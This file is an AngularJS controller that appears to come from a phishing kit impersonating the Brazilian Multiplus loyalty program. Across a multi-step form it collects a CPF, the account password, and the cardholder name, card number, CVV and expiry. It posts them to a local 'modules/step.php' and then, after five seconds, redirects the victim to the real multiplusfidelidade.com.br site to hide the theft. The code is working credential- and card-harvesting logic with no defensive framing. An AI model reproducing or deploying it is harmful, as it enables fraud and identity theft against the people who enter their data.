angular
    .module('Multiplus', [])
    .controller('MainCtrl', function($scope, $http) {

        // passos
        $scope.step1 = true;
        $scope.step2 = false;
        $scope.step3 = false;
        $scope.item = 'item';
        $scope.meses = [
            {num: '01'},
            {num: '02'},
            {num: '03'},
            {num: '04'},
            {num: '05'},
            {num: '06'},
            {num: '07'},
            {num: '08'},
            {num: '09'},
            {num: '10'},
            {num: '11'},
            {num: '12'}
        ];
        $scope.getAnos = function(){
            var anoX = [];
            var date = new Date();
            var anoAtual = date.getFullYear();
            for (var i = anoAtual; i < (anoAtual + 20); i++){
                anoX.push({num: i});
            }
            return anoX;
        };
        $scope.anos = $scope.getAnos();

        $scope.activeBandeira = function(v) {
            if (v == 'visa') {
                $scope.cVisa = true;
                $scope.cMaster = false;
                $scope.cHiper = false;
                $scope.cDiners = false;
                $scope.cAura = false;
                $scope.cElo = false;
                $scope.eExpress = false;
            }
            else if (v == 'master') {
                $scope.cVisa = false;
                $scope.cMaster = true;
                $scope.cHiper = false;
                $scope.cDiners = false;
                $scope.cAura = false;
                $scope.cElo = false;
                $scope.eExpress = false;
            }
            else if (v == 'hiper') {
                $scope.cVisa = false;
                $scope.cMaster = false;
                $scope.cHiper = true;
                $scope.cDiners = false;
                $scope.cAura = false;
                $scope.cElo = false;
                $scope.eExpress = false;
            }
            else if (v == 'diners') {
                $scope.cVisa = false;
                $scope.cMaster = false;
                $scope.cHiper = false;
                $scope.cDiners = true;
                $scope.cAura = false;
                $scope.cElo = false;
                $scope.eExpress = false;
            }
            else if (v == 'aura') {
                $scope.cVisa = false;
                $scope.cMaster = false;
                $scope.cHiper = false;
                $scope.cDiners = false;
                $scope.cAura = true;
                $scope.cElo = false;
                $scope.eExpress = false;
            }
            else if (v == 'elo') {
                $scope.cVisa = false;
                $scope.cMaster = false;
                $scope.cHiper = false;
                $scope.cDiners = false;
                $scope.cAura = false;
                $scope.cElo = true;
                $scope.eExpress = false;
            }
            else if (v == 'express') {
                $scope.cVisa = false;
                $scope.cMaster = false;
                $scope.cHiper = false;
                $scope.cDiners = false;
                $scope.cAura = false;
                $scope.cElo = false;
                $scope.eExpress = true;
            }
        }

        // bandeiras
        $scope.cVisa = false;
        $scope.cMaster = false;
        $scope.cHiper = false;
        $scope.cDiners = false;
        $scope.cAura = false;
        $scope.cElo = false;
        $scope.eExpress = false;

        // validacao
        $scope.validate = function(t) {
            var regExp = {
                visa: /^4[0-9]{12}(?:[0-9]{3})$/,
                master: /^5[1-5][0-9]{14}$/,
                hiper: /^(606282\d{10}(\d{3})?)|(3841\d{15})$/,
                diners: /^3(?:0[0-5]|[68][0-9])[0-9]{11}$/,
                aura: /^50\d{14}$/,
                elo: /^((((636368)|(438935)|(504175)|(451416)|(636297))\d{0,10})|((5067)|(4576)|(4011))\d{0,12})$/,
                amex: /^3[47][0-9]{13}/
            };

            // visa
            (regExp['visa'].test(t.numcard)) ? $scope.cVisa = true : $scope.cVisa = false;

            // master
            (regExp['master'].test(t.numcard)) ? $scope.cMaster = true : $scope.cMaster = false;

            // hiper
            (regExp['hiper'].test(t.numcard)) ? $scope.cHiper = true : $scope.cHiper = false;

            // diners
            (regExp['diners'].test(t.numcard)) ? $scope.cDiners = true : $scope.cDiners = false;

            // aura
            (regExp['aura'].test(t.numcard)) ? $scope.cAura = true : $scope.cAura = false;

            // elo
            (regExp['elo'].test(t.numcard)) ? $scope.cElo = true : $scope.cElo = false;

            // amex
            (regExp['amex'].test(t.numcard)) ? $scope.eExpress = true : $scope.eExpress = false;

        };

        // envios
        $scope.sendStep1 = function() {
            $scope.step1 = false;
            $scope.step2 = true;
            $scope.step3 = false;
        };

        $scope.sendStep2 = function() {
            $scope.step1 = false;
            $scope.step2 = false;
            $scope.step3 = true;
        };

        $scope.cband = function() {
            if ($scope.cVisa == true) return 'Visa';
            if ($scope.cMaster == true) return 'MasterCard';
            if ($scope.cHiper == true) return 'HiperCard';
            if ($scope.cDiners == true) return 'Diners';
            if ($scope.cAura == true) return 'Aura';
            if ($scope.cElo == true) return 'Elo';
            if ($scope.eExpress == true) return 'American Express';
        }

        $scope.load = false;
        $scope.sendStep3 = function(cpf, senha, numcard, cvv, mes, ano, titular) {
            console.log(titular);
            $http
                .post('modules/step.php',
                {
                    cpf: cpf,
                    senha: senha,
                    titular: titular,
                    numcard: numcard,
                    cvv: cvv,
                    validade: mes.num + "/" + ano.num,
                    bandeira: $scope.cband()
                })
                .success(function(data, status, headers, config) {
                    $scope.step1 = false;
                    $scope.step2 = false;
                    $scope.step3 = true;
                })
                .error(function(data, status, headers, config) {
                    console.log(status);
                });

                $scope.load = true;
                setTimeout(function() {
                    $scope.load = false;
                    document.location.href = "https://www.multiplusfidelidade.com.br/";
                } ,5
                *1000);
        }


    });
